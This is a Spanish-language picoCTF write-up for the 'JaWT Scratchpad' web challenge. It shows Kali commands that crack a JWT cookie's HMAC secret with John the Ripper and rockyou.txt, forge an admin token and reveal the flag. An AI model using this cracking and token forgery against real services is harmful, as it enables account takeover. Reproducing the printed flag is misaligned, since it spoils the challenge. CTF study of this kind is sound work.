# JaWT Scratchpad

## Descripción
Check the admin scratchpad!
## Solución
### Solución:
Lo primero al entrar a la página que nos entregan, vemos esta pantalla
![[03JAWT01.png]]

Logueamos con nuestro nombre para acceder al scratchpad
![[03JAWT02.png]]

Usamos el cookie editor para obtener el valor de la cookie jwt, lo tomamos y vamos a intentar crackearlo
![[03JAWT03.png]]

ahora que tenemos este valor, realizaremos este proceso en Linux

Creamos un archivo llamado hash para almacenar la cookie
```
┌──(kali㉿kali)-[~]
└─$ nano hash                          
      
┌──(kali㉿kali)-[~]
└─$ cat hash   
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiT21hciJ9.CtS_cvXvkcmUiFtr7ToUjMX1Xbpueh2ilBu369Qxh5k
```

Ahora, usaremos el archivo rockyou.txt de los archivos, que almacena diferentes contraseñas para crackear este tipo de cookies
```
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists
dirb  dirbuster  dnsmap.txt  fasttrack.txt  fern-wifi  john.lst  legion  metasploit  nmap.lst  rockyou.txt.gz  sqlmap.txt  wfuzz  wifite.txt

┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

┌──(kali㉿kali)-[~]
└─$ head /usr/share/wordlists/rockyou.txt
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```

Ahora usaremos la herramienta 'John the Ripper' para poder crackear esta cookie, descubriendo la clave de encriptación: ilovepico
```
┌──(kali㉿kali)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt                  
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:01 DONE (2026-02-28 19:43) 0.5524g/s 4086Kp/s 4086Kc/s 4086KC/s iloverob4live345..ilovemymother@
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Usando el decodificador, alteramos la cookie
![[03JAWT04.png]]

Ya decodificada
![[03JAWT05.png]]

Tras recargar la página, ya somos admin y obtenemos la flag
![[03JAWT06.png]]

picoCTF{jawt_was_just_what_you_thought_bbb82bd4a57564aefb32d64dafb60583}
## Notas
